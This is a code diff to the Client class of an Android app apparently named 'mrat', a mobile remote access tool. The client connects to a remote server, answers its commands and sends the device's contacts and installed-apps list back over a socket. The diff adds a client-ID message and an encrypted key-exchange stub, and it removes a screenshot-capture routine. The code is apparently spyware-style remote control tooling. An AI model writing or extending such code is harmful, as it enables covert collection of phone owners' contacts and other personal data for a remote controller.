@@ -5,20 +5,13 @@ import android.content.Context;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
 import android.database.Cursor;
-import android.graphics.Bitmap;
-import android.graphics.drawable.Drawable;
-import android.os.Environment;
 import android.os.StrictMode;
 import android.provider.ContactsContract;
 import android.telephony.TelephonyManager;
-import android.util.Log;
 import android.view.View;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
-import java.io.File;
-import java.io.FileNotFoundException;
-import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -27,11 +20,13 @@ import java.net.Inet4Address;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
 import java.net.Socket;
+import java.sql.Timestamp;
 import java.util.Collections;
 import java.util.List;
 import java.util.Locale;
-import java.util.TimeZone;
 
+import afernandezb92.mrat.cipher.CipherAES;
+import afernandezb92.mrat.cipher.RSADecryption;
 import afernandezb92.mrat.cipher.RSAEncryption;
 import afernandezb92.mrat.messages.Mensaje;
 
@@ -47,10 +42,13 @@ public class Client extends MainActivity {
     protected static final int RGETINSTALLEDAPPS = 5;
     protected static final int TGETINFO = 6;
     protected static final int RGETINFO = 7;
-    protected static final int TGETKEY = 8;
-    protected static final int RGETKEY = 9;
-    protected static final int ROK = 10;
-    protected static final int RERR = 11;
+    protected static final int TSENDID = 8;
+    protected static final int TGETKEY = 9;
+    protected static final int RGETKEY = 10;
+    protected static final int TSENDKEY = 11;
+    protected static final int ROK = 12;
+    protected static final int RERR = 13;
+    protected static final int CLIENTID = 0;
     View view;
     Socket socket = null;
     InetAddress address;
@@ -60,6 +58,8 @@ public class Client extends MainActivity {
     DataInputStream instream = null;
     Boolean debug = true;
     Context context;
+    Timestamp ts;
+    CipherAES cipherAes;
 
     public Client (String hostname, int port, Context context){
         try {
@@ -71,10 +71,24 @@ public class Client extends MainActivity {
             socket = new Socket(address, port);
             this.context = context;
             System.out.println("Cliente arrancado");
+            sendId();
             run();
         } catch (ConnectException c){
             System.out.println("Connection refusd");
         } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    public void sendId(){
+        Mensaje.TSendId tid = new Mensaje.TSendId(CLIENTID);
+        System.out.println(tid.toString());
+        try {
+            o = socket.getOutputStream();
+            tid.writeTo(o);
+        } catch (IOException e) {
+            e.printStackTrace();
+        } catch (Exception e) {
             e.printStackTrace();
         }
     }
@@ -91,13 +105,6 @@ public class Client extends MainActivity {
                             System.out.println(contact);
                         }
                         sendContacts(contact);
-                        break;
-                    case TGETSCREENSHOT:
-                        Mensaje.TGetScreenshot screen = (Mensaje.TGetScreenshot) request;
-                        if (debug){
-                            System.out.println(screen);
-                        }
-                        takeScreenshot(screen);
                         break;
                     case TGETINSTALLEDAPPS:
                         Mensaje.TGetInstalledApps apps = (Mensaje.TGetInstalledApps) request;
@@ -119,6 +126,13 @@ public class Client extends MainActivity {
                             System.out.println(key);
                         }
                         sendKey(key);
+                        break;
+                    case TSENDKEY:
+                        Mensaje.TSendKey skey = (Mensaje.TSendKey) request;
+                        if (debug){
+                            System.out.println(skey);
+                        }
+                        //saveKey(skey);
                         break;
                     default:
                         System.out.println("Mensaje desconocido");
@@ -163,6 +177,34 @@ public class Client extends MainActivity {
             }
         }
     }
+
+    /*private void saveKey(Mensaje.TSendKey t){
+        String key, nonceString;
+        int nonce;
+        if(debug){
+            System.out.println("Key: " + t.getKeyEncrypt());
+            System.out.println("Nonce: " + t.getNonceEncrypt());
+        }
+        key = RSADecryption.decrypt(t.getKeyEncrypt());
+        nonceString = RSADecryption.decrypt(t.getNonceEncrypt());
+        cipherAes = new CipherAES(key.getBytes());
+        if(debug){
+            System.out.println("Key: " + key);
+            System.out.println("Nonce: " + nonceString);
+        }
+        ts = new Timestamp(System.currentTimeMillis());
+        nonce = Integer.parseInt(nonceString) + 1;
+        Mensaje.ROk ok = new Mensaje.ROk(t, Integer.toString(nonce), Long.toString(ts.getTime()));
+        try {
+            if (debug){
+                System.out.println(ok);
+            }
+            o = socket.getOutputStream();
+            ok.writeTo(o);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }*/
 
     //CONTACTS
     private void sendContacts (Mensaje.TGetContact t){
@@ -241,61 +283,6 @@ public class Client extends MainActivity {
         }
         c.close();
         return isEmpty;
-    }
-
-    //SCREENSHOT
-    private void takeScreenshot(Mensaje.TGetScreenshot t) {
-        Bitmap b = getBitmap();
-        if(saveBitmap(b) != -1){
-            Mensaje.RErr err = new Mensaje.RErr(t,"error take screenshot");
-            try {
-                if (debug){
-                    System.out.println(err);
-                }
-                o = socket.getOutputStream();
-                err.writeTo(o);
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-        } else {
-            Mensaje.ROk ok = new Mensaje.ROk(t);
-            try {
-                if (debug){
-                    System.out.println(ok);
-                }
-                o = socket.getOutputStream();
-                ok.writeTo(o);
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-        }
-    }
-
-    private Bitmap getBitmap() {
-        //View rootView = view.getRootView();
-        //rootView.setDrawingCacheEnabled(true);
-        //return rootView.getDrawingCache();
-        View view = getWindow().getDecorView();//.getRootView();
-        view.setDrawingCacheEnabled(true);
-        return view.getDrawingCache();
-
-    }
-
-    private int saveBitmap(Bitmap bitmap) {
-        File imagePath = new File(Environment.getExternalStorageDirectory() + "/screenshot.png");
-        FileOutputStream fos;
-        try {
-            fos = new FileOutputStream(imagePath);
-            bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
-            fos.flush();
-            fos.close();
-            return 0;
-        } catch (FileNotFoundException e) {
-            Log.e("GREC", e.getMessage(), e);
-        } catch (IOException e) {
-            Log.e("GREC", e.getMessage(), e);
-        }
-        return -1;
     }
 
     // INSTALLED APPS
